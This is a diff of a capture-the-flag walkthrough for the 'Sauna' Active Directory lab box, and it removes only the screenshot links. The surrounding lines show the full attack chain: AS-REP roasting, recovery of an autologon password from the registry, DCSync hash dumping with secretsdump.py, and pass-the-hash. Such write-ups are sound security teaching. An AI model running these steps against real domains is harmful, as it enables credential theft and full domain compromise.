@@ -30,8 +30,6 @@ nmap -p53,80,88,135,139,389,445,464,593,636,3268,5985 -sCV <target>
 
 A Domain Controller with a web server on 80. Add `egotistical-bank.local` to `/etc/hosts`.
 
-![Nmap scan of the Domain Controller](../images/sauna-01-nmap.png)
-
 ### Building a username list
 
 The site's **"Meet the team"** page lists full names (e.g. *Fergus Smith*, *Hugo Bear*, *Steven
@@ -43,8 +41,6 @@ Kerb* ...). Generate candidate usernames with common conventions (`fsmith`, `fer
 ./username-anarchy -i names.txt > users.txt
 ```
 
-![Employee names on the website used to seed the username list](../images/sauna-02-usernames.png)
-
 ---
 
 ## Foothold — AS-REP Roasting
@@ -55,8 +51,6 @@ Request AS-REPs for the candidate users; `fsmith` has pre-auth disabled:
 GetNPUsers.py egotistical-bank.local/ -usersfile users.txt -no-pass -dc-ip <target>
 # $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:...
 ```
-
-![GetNPUsers retrieving the AS-REP hash for fsmith](../images/sauna-03-asreproast.png)
 
 Crack it:
 
@@ -88,8 +82,6 @@ reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
 # DefaultPassword   : Moneymakestheworldgoround!
 ```
 
-![WinPEAS / registry showing svc_loanmgr autologon password](../images/sauna-04-winpeas-autologon.png)
-
 The real account name is `svc_loanmgr`:
 
 ```bash
@@ -106,8 +98,6 @@ secretsdump.py egotistical-bank.local/svc_loanmgr:'Moneymakestheworldgoround!'@<
   -just-dc-user Administrator
 # Administrator:500:aad3b...:<admin-nt-hash>:::
 ```
-
-![secretsdump via DCSync dumping the Administrator hash](../images/sauna-05-dcsync.png)
 
 Pass-the-Hash as Administrator:
 
